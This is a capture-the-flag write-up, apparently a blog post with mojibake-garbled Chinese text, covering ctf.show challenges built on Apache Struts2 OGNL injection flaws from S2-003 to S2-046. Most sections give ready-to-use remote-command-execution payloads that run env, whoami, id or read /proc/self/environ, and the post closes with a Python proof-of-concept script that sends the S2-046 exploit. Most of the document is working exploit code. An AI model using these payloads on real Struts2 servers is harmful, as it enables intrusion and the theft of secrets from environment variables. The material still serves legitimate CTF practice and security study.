WEB-280(S2-016å’ŒS2-005)\n\nS2-003\n\n```plain\nStruts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œ,è€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.11.2\n```\n\nå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unicodeç¼–ç å’Œ8è¿›åˆ¶æ¥bypass `#`\n\nè¿™é“é¢˜ç›®åªèƒ½ç”¨è¿™ä¸ªpocåšå‡ºæ¥ ç½‘ä¸Šçš„payloadéƒ½æ²¡æœ‰å›æ˜¾ https://github.com/wyzmgmdg/Struts2Scan\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png)\n\nç„¶åS2-016å’ŒS2-005éƒ½èƒ½æ‰“é€š\n\næˆ–è€…\n\npostä¼ å‚\n\n```plain\nredirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%65%6e%76%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„å‘½ä»¤å¿…é¡»è¦ç»è¿‡urlå…¨å­—ç¬¦ç¼–ç æ‰èƒ½æˆåŠŸ ä¹Ÿå°±æ˜¯æˆ‘æ ‡è“è¿™é‡Œ é€”ä¸­å‘½ä»¤ä¸ºenv\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692947661826-dd0d571e-eef9-4a67-a9c4-7c26bac99054.png)\n\nå‚è€ƒ:https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md\n\n# WEB-281(S2-007)\n\nåŸç†:\n\nå½“é…ç½®äº†éªŒè¯è§„åˆ™ <ActionName>-validation.xml æ—¶ï¼Œè‹¥ç±»å‹éªŒè¯è½¬æ¢å‡ºé”™ï¼Œåç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æå¹¶è¿”å›\n\nå½“ç”¨æˆ· age ä»¥strè€Œä¸æ˜¯çš„å½¢å¼æäº¤æ—¶ intï¼ŒæœåŠ¡å™¨å°†æ‹¼æ¥ `â€œâ€˜â€œ + value + â€œâ€˜â€œ `ä»£ç ï¼Œç„¶åä½¿ç”¨OGNLè¡¨è¾¾å¼å¯¹å…¶è¿›è¡Œè§£æã€‚ä¸ºäº†æˆåŠŸå®Œæˆä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªé…ç½®æœ‰ç›¸ä¼¼éªŒè¯è§„åˆ™çš„è¡¨å•å­—æ®µï¼Œä»¥äº§ç”Ÿè½¬æ¢é”™è¯¯ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥SQLå•å¼•å·çš„æ–¹å¼æ³¨å…¥ä»»ä½•OGNLè¡¨è¾¾å¼ä»£ç \n\nå½±å“ç‰ˆæœ¬ï¼šStruts2 2.0.0 - Struts2 2.2.3\n\npayloadï¼š\n\n```plain\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '\n```\n\n# WEB-282(S2-008)\n\nåŸç†:\n\nS2-008 æ¶‰åŠå¤šä¸ªæ¼æ´ï¼ŒCookie æ‹¦æˆªå™¨é”™è¯¯é…ç½®å¯é€ æˆ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤š Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å¯¹ Cookie åç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œä¸€äº›å…³é”®å­—ç¬¦æ— æ³•ä½¿ç”¨ä½¿å¾—è¿™ä¸ªç‚¹æ˜¾å¾—æ¯”è¾ƒé¸¡è‚‹ã€‚å¦ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ç‚¹å°±æ˜¯åœ¨ struts2 åº”ç”¨å¼€å¯ devMode æ¨¡å¼åä¼šæœ‰å¤šä¸ªè°ƒè¯•æ¥å£èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯æˆ–ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯è¿™ç§æƒ…å†µåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡ ä¹ä¸å¯èƒ½å­˜åœ¨ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾ˆé¸¡è‚‹ã€‚\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.1.0 â€“ 2.3.1\n\n\n\nè¿™é“é¢˜ç›®å¾ˆå¥‡æ€ªåªèƒ½ç”¨ä¸Šé¢çš„pocè„šæœ¬æ‰èƒ½æ‰“æˆåŠŸ çœ‹äº†è„šæœ¬çš„æ„é€  payloadå¦‚ä¸‹\n\næ‰‹åŠ¨è¾“å…¥å°±æ˜¯æ²¡æœ‰å›æ˜¾ åå¼¹shellä¹Ÿæ˜¯ä¸€æ ·\n\n```plain\n/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cmd%27%29.getInputStream%28%29%29)\n```\n\n# WEB-283(Struts2 showcaseè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´)\n\nåŸç†ï¼š\n\nè¿™ä¸ªæ¼æ´å†æ¬¡æ¥æºäºs2-003ã€s2-005\n\nå‚è€ƒStruts2æ¼æ´åˆ†æä¹‹Ognlè¡¨è¾¾å¼ç‰¹æ€§å¼•å‘çš„æ–°æ€è·¯ï¼Œæ–‡ä¸­è¯´åˆ°ï¼Œè¯¥å¼•å…¥ognlçš„æ–¹æ³•ä¸å…‰å¯èƒ½å‡ºç°åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œä¹Ÿå¯èƒ½å‡ºç°åœ¨å…¶ä»–javaåº”ç”¨ä¸­\n\nStruts2å¯¹s2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨ï¼Œåœ¨s2-005ä¸­å¯ç›´æ¥é€šè¿‡OGNLç»•è¿‡è¯¥é™åˆ¶ï¼Œå¯¹äº`#`å·ï¼ŒåŒæ ·ä½¿ç”¨ç¼–ç `\\u0023`æˆ–`\\43`è¿›è¡Œç»•è¿‡ï¼›äºæ˜¯Struts2å¯¹s2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢`\\`ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä½¿ç”¨æˆ·ä¸èƒ½æäº¤åæ–œçº¿\n\nä½†æ˜¯ï¼Œå¦‚æœå½“å‰actionä¸­æ¥å—äº†æŸä¸ªå‚æ•°exampleï¼Œè¿™ä¸ªå‚æ•°å°†è¿›å…¥OGNLçš„ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†OGNLè¡¨è¾¾å¼æ”¾åœ¨exampleå‚æ•°ä¸­ï¼Œç„¶åä½¿ç”¨`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`çš„æ–¹æ³•æ¥æ‰§è¡Œå®ƒï¼Œä»è€Œç»•è¿‡å®˜æ–¹å¯¹`#ã€\\`ç­‰ç‰¹æ®Šå­—ç¬¦çš„é˜²å¾¡\n\né€šè¿‡Struts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åè€Œä¸æ£€æŸ¥å‚æ•°å€¼çš„æ–¹å¼è¿›è¡Œæ„é€ OGNLè¡¨è¾¾å¼ä»è€Œé€ æˆä»£ç æ‰§è¡Œ\n\npayload: æ¥æºäºhttps://www.freebuf.com/articles/web/280245.html\n\n```plain\n/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]\n```\n\n# WEB-284(S2-012)\n\nåŸç†:\n\nå¦‚æœåœ¨é…ç½® Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ `${param_name}` ä½œä¸ºé‡å®šå‘å˜é‡\n\næ¯”å¦‚:\n\n```plain\nxml\n<package name=\"S2-012\" extends=\"struts-default\">\n    <action name=\"user\" class=\"com.demo.action.UserAction\">\n        <result name=\"redirect\" type=\"redirect\">/index.jsp?name=${name}</result>\n        <result name=\"input\">/index.jsp</result>\n        <result name=\"success\">/index.jsp</result>\n    </action>\n</package>\n```\n\nè¿™é‡Œ UserAction ä¸­å®šä¹‰æœ‰ä¸€ä¸ª name å˜é‡ï¼Œå½“è§¦å‘ redirect ç±»å‹è¿”å›æ—¶ï¼ŒStruts2 è·å–ä½¿ç”¨ ${name} è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹ name å‚æ•°çš„å€¼æ‰§è¡Œ OGNL è¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„ OGNL è¡¨è¾¾å¼å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\n\npayloadï¼š\n\n```plain\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/proc/self/environ\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n# WEB-285(S2-013)\n\nåŸç†ï¼š\n\nApache Struts2çš„s:aå’Œs:urlæ ‡ç­¾éƒ½æä¾›äº†ä¸€ä¸ªincludeParamså±æ€§ã€‚æ­¤å±æ€§å…è®¸ä½¿ç”¨çš„å€¼åŒ…æ‹¬noneã€getã€allã€‚å½“è¯¥å±æ€§è¢«è®¾ç½®ä¸ºgetæˆ–allæ—¶ï¼ŒApache Struts2ä¼šå°†ç”¨æˆ·æäº¤çš„å‚æ•°å€¼ä½œä¸ºOgnlè¡¨è¾¾å¼æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æäº¤å¸¦æœ‰æ¶æ„çš„Onglè¡¨è¾¾å¼ï¼Œè¾¾åˆ°æ‰§è¡Œä»»æ„Javaä»£ç çš„ç›®çš„ã€‚åªè¦åŸºäºApache Struts2å¼€å‘çš„JSPä»£ç ä¸­ä½¿ç”¨äº†url/aæ ‡ç­¾å¹¶ä¸”è®¾ç½®äº†includeParamså±æ€§ä¸ºallæˆ–getï¼Œè¿œç¨‹æ”»å‡»è€…å³å¯åˆ©ç”¨æ­¤æ¼æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n\npayload: å‚è€ƒ:https://www.anquanke.com/post/id/266386#h3-3\n\n```plain\nlink.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\n```\n\n# WEB-286(S2-015)\n\nåŸç†ï¼š\n\nåœ¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¯¼è‡´ç³»ç»Ÿè¢«é»‘å®¢å…¥ä¾µã€‚æ¶æ„ç”¨æˆ·å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\nå½±å“ç‰ˆæœ¬ï¼š\n\n- Struts2.3.5 â€“ 2.3.31\n- Struts2.5 â€“ 2.5.10\n\nä½ å¦ˆ è¯´æ˜¯S2-015çš„æ¼æ´ ä½†æ˜¯pocè¦ç”¨S2-045æ‰èƒ½æ‰“é€š\n\nè€Œä¸”ç”¨pocè„šæœ¬æ‰“é€šS2-015é‡Œé¢æ²¡æœ‰flag\n\nè„šæœ¬æˆ–è€…\n\npayload: æ¥æºï¼š[https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html](https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045è¿œç¨‹ä»£ç æ‰§è¡Œ.html)\n\n```plain\n%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692955967130-30c47a51-06f3-4d81-8dfa-6b8dc8404498.png)\n\n# WEB-287(S2-016)\n\nåŸç†ï¼š\n\né—®é¢˜ä¸»è¦å‡ºåœ¨å¯¹äºç‰¹æ®ŠURLå¤„ç†ä¸­ï¼Œredirectä¸redirectActionåé¢è·Ÿä¸ŠOgnlè¡¨è¾¾å¼ä¼šè¢«æœåŠ¡å™¨æ‰§è¡Œ\n\nåœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥\"action:\"ã€â€œredirect:â€ã€\"redirectAction:\"ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤\n\næ‰€ä»¥ï¼Œè®¿é—®http://your-ip:8080/index.action?redirect:OGNLè¡¨è¾¾å¼å³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼\n\npayload:\n\n```plain\n/default.action?redirect:${#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(\"env\").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯æäº¤çš„æ—¶å€™éœ€è¦å…¨å­—ç¬¦ç¼–ç \n\n# WEB-288(S2-019)\n\nåŸç†ï¼š\n\nè¦æ±‚å¼€å‘è€…æ¨¡å¼ï¼Œä¸”pocç¬¬ä¸€ä¸ªå‚æ•°æ˜¯debugï¼Œè§¦å‘ç‚¹åœ¨DebuggingInterceptorä¸Šï¼ŒæŸ¥çœ‹interceptå‡½æ•°ï¼Œä»debugå‚æ•°è·å–è°ƒè¯•æ¨¡å¼ï¼Œå¦‚æœæ¨¡å¼æ˜¯commandï¼Œåˆ™æŠŠexpressionå‚æ•°æ”¾åˆ°stack.findValueä¸­ï¼Œæœ€ç»ˆæ”¾åˆ°äº†ognl.getValueä¸­\n\npayload: æ¥æº:https://www.freebuf.com/vuls/246969.html\n\n```plain\n?debug=command&expression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()\n```\n\nä¸»è¦urlå…¨å­—ç¬¦ç¼–ç çš„æ—¶å€™ä¸€å®šè¦æŠŠé‡Œé¢çš„`&`åˆ«ç¼–ç ä¸ç„¶ä¼šæ··æ·†\n\n# WEB-289(S2-029)\n\nåŸç†:\n\nStrutsæ¡†æ¶è¢«å¼ºåˆ¶æ‰§è¡Œæ—¶ï¼Œå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œå› æ­¤å¯ä»¥ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œå½“ä¸€ä¸ªæ ‡ç­¾çš„å±æ€§å°†è¢«æ¸²æŸ“æ—¶ï¼Œè¯¥å€¼å°†è¢«å†æ¬¡è¯„ä¼°\n\nä¾‹å¦‚ï¼šä»£ç æ‰§è¡Œè¿‡ç¨‹å¤§è‡´ä¸ºå…ˆå°è¯•è·å–valueçš„å€¼ï¼Œå¦‚æœvalueä¸ºç©ºï¼Œé‚£ä¹ˆå°±äºŒæ¬¡è§£é‡Šæ‰§è¡Œäº†nameã€‚å¹¶ä¸”åœ¨æ‰§è¡Œå‰ç»™nameåŠ ä¸Šäº†â€%{}â€ã€‚æœ€ç»ˆé€ æˆäºŒæ¬¡æ‰§è¡Œ\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.24.1ï¼ˆ2.3.20.3é™¤å¤–ï¼‰\n\npayloadï¼š\n\n```plain\n/default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))\n```\n\n# WEB-290(S2-032)\n\nåŸç†:\n\nStruts2åœ¨å¼€å¯äº†åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼ˆDynamic Method Invocationï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨method:<name>çš„æ–¹å¼æ¥è°ƒç”¨åå­—æ˜¯<name>çš„æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åå°†ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è®¡ç®—ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´\n\nå½±å“ç‰ˆæœ¬: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)\n\npayloadï¼š\n\n```plain\n?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=env\n```\n\n# WEB-291(S2-033)\n\nåŸç†:\n\nå½“å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œå¹¶ä¸”åŒæ—¶ä½¿ç”¨äº†Strut2 REST Pluginæ’ä»¶æ—¶ï¼Œä½¿ç”¨â€œ!â€æ“ä½œç¬¦è°ƒç”¨åŠ¨æ€æ–¹æ³•å¯èƒ½æ‰§è¡Œognlè¡¨è¾¾å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œ\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 â€“ Struts 2.3.28 (ä¸åŒ…æ‹¬ 2.3.20.3å’Œ 2.3.24.3)\n\npayload:\n\n```plain\n/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=env\n```\n\n# WEB-292(S2-037)\n\nåŸç†:\n\nå½“ä½¿ç”¨RESTæ’ä»¶å¯ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¯ä»¥ä¼ é€’å¯ç”¨äºåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„è¡¨è¾¾å¼\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 - Struts Struts 2.3.28ï¼ˆ2.3.20.3å’Œ2.3.24.3é™¤å¤–ï¼‰\n\npayload:\n\n```plain\n/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=whoami\n```\n\n# WEB-293(S2-045)\n\nåŸç†:\n\nåœ¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¯¼è‡´ç³»ç»Ÿè¢«é»‘å®¢å…¥ä¾µ\n\næ¶æ„ç”¨æˆ·å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 â€“ Struts 2.3.31 Struts 2.5 â€“ Struts 2.5.10\n\npayload:\n\n```plain\nContent-Type: \"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692960165492-0dc1a65d-933a-4280-9bbc-3ef12278f5d5.png)\n\n# WEB-294(S2-046)\n\nåŸç†ï¼š\n\nS2-046æ¼æ´å’ŒS2-045æ¼æ´å¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ç”±äºå¯¹HeaderæŸä¸ªå­—æ®µä¿¡æ¯å¤„ç†å‘ç”Ÿå¼‚å¸¸ï¼Œé”™è¯¯ä¿¡æ¯è¿å¸¦ç€payloadåŒè¿‡buildErrorMessageå‡½æ•°å¸¦å…¥LocalizedTextUtil.findTexté€ æˆçš„ã€‚ ä½†æ˜¯ä¸åŒçš„æ˜¯ï¼Œè¿™æ¬¡æ¼æ´çš„è§¦å‘ç‚¹åœ¨Content-Lengthå’ŒContent-Dispositionå­—æ®µçš„filenameä¸­ã€‚\n\npayload:\n\n```plain\n#!/usr/bin/env python\n# encoding:utf-8\nimport requests\nclass Sugarcrm():\n    def poctest(self):   \n        boundary=\"---------------------------735323031399963166993862150\"\n        paylaod=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\n        url = 'http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action'\n        headers = {'Content-Type': 'multipart/form-data; boundary='+boundary+''}\n        data =\"--\"+boundary+\"\\r\\nContent-Disposition: form-data; name=\\\"foo\\\"; filename=\\\"\"+paylaod+\"\\0b\\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\nx\\r\\n--\"+boundary+\"--\"\n        rs=requests.post(url, headers=headers,data=data)\n        print(rs.text)\n\nif __name__ == '__main__':\n    test = Sugarcrm()\n    test.poctest()\n```\n\nä¸æ‡‚ã€‚ã€‚ã€‚\n\n# 